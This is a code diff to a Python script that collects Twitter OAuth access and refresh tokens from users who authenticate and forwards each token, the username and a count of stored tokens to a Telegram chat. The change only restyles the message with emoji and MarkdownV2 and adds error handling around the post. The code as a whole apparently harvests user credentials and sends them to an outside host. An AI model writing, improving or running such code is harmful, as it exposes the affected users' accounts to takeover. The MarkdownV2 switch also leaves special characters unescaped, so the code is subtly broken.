@@ -139,23 +139,24 @@ def refresh_token_in_db(refresh_token, username):
 
 # Send message via Telegram with detailed notification
 def send_message_via_telegram(access_token, refresh_token=None):
-    # Get the username from the access token
     username = get_twitter_username(access_token)
+
     if username:
         twitter_url = f"https://twitter.com/{username}"
     else:
         twitter_url = "Unknown user"
-    
-    # Calculate total tokens in the database
+
     total_tokens = get_total_tokens()
 
     # Construct a detailed message
     message = (
-        f"New user authenticated:\n"
-        f"Access Token: {access_token}\n"
-        f"Refresh Token: {refresh_token if refresh_token else 'Not Available'}\n"
-        f"Twitter Profile: {username if username else 'Unknown user'} ({twitter_url})\n"
-        f"Total Tokens in Database: {total_tokens}"
+        f"🆕 *New User Authentication*\n"
+        f"👤 *Username:* {username if username else 'Unknown user'}\n"
+        f"🔑 *Access Token:* {access_token}\n"
+        f"🔄 *Refresh Token:* {refresh_token if refresh_token else 'Not Available'}\n"
+        f"🔗 *Twitter Profile:* [View Profile]({twitter_url})\n"
+        f"📊 *Total Tokens in Database:* {total_tokens}\n"
+        f"✅ *Action Required:* Please keep your tokens secure."
     )
 
     # Send the message to Telegram
@@ -163,10 +164,15 @@ def send_message_via_telegram(access_token, refresh_token=None):
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"
+        "parse_mode": "MarkdownV2"  # Use MarkdownV2 to support special characters
     }
-    requests.post(url, json=data)
 
+    try:
+        response = requests.post(url, json=data)
+        response.raise_for_status()  # Raise an error for bad responses
+        print("Notification sent successfully!")
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send notification: {e}")
 # Function to get Twitter username
 def get_twitter_username(access_token):
     url = "https://api.twitter.com/2/users/me"
